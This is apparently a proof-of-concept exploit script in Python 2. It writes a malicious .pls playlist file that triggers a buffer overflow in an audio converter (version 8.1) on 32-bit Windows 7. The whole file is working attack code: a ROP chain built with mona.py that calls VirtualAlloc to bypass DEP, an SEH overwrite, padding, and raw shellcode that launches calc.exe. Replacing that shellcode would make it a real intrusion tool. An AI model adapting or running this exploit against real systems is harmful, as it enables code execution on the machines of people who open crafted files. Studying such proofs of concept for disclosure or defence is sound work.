#!/usr/bin/python
# tested windows 7 x86
import struct

outfile = "popcalc_exploit_audio_converter_8.1.pls"


def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00429dbd,  # POP ESI # RETN [audconv.exe] 
      0x0044b290,  # ptr to &VirtualAlloc() [IAT audconv.exe]
      0x1000a617,  # MOV EAX,DWORD PTR DS:[ESI] # RETN [audconv.dll] 
      0x10037d05,  # XCHG EAX,ESI # RETN [audconv.dll] 
      0x10040dd7,  # POP EBP # RETN [audconv.dll] 
      0x0040a8f4,  # & call esp [audconv.exe]
      0x10060ba6,  # POP EBX # RETN [audconv.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x10082cb9,  # POP EDX # RETN [audconv.dll] 
      0x00001000,  # 0x00001000-> edx
      0x10083cb7,  # POP ECX # RETN [audconv.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x100097cb,  # POP EDI # RETN [audconv.dll] 
      0x1003f2b9,  # RETN (ROP NOP) [audconv.dll]
      0x1006cbde,  # POP EAX # RETN [audconv.dll] 
      0x90909090,  # nop
      0x1002ef14,  # PUSHAD # RETN [audconv.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()


junk = "A" * 2064

junk2 = "A" * (2132 - (len(junk) + len(rop_chain)))


# pop calc.exe

shellcode =  "\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
shellcode += "\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
shellcode += "\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
shellcode += "\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
shellcode += "\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
shellcode += "\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
shellcode += "\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC"


junk3 = "A" * (4432 - (len(junk) + len(junk2) + len(rop_chain) + len(shellcode)))


nseh = "D" * 4

seh = struct.pack("<L",0x1001A762) # ADD ESP 10F0; RETN


payload = junk + rop_chain + junk2 + shellcode + junk3 + nseh + seh
payload += "C" * (50000-len(payload))



with open(outfile,'w') as expoit:
	expoit.write(payload)
print "pls File Created successfully\n"